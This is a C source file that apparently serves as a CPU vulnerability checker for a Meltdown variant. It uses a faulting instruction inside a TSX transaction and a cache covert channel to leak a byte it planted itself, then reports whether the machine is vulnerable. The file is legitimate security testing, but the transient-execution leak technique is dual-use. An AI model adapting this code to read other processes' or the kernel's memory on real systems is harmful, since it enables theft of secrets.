#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

#define SECRET 'S'

int main(int argc, char **argv)
{
    PREPARE();

    int status;
    int pkey;
    char *buffer;
    buffer = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE,
                  MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    *buffer = SECRET;

    // Flush our shared memory
    flush_shared_memory();
    start_time = time(NULL);
    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        // Ensure data is in the cache
        maccess(buffer);
        unsigned status;
        // Start TSX
        if (try_start())
        {
// ud#, due to wrong lock prefix
#if !defined(__aarch64__)
            asm volatile(".byte 0xf0");
            asm volatile("inc %rax");
#else
            asm volatile(".word 0x00000000\n"); //raises sigill
#endif
            asm volatile(".word 0x0000000000000000\n");
            asm volatile(".word 0x0000000000000000\n");
            // Encode in the cache
            maccess(mem + (*buffer) * pagesize);

            try_abort();
        }
        try_end();

        // Recover from the covert channel
        //Recover data from cache covert channel
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Meltdown_UD: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    int exit_result = 0;
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_UD: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_UD: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}
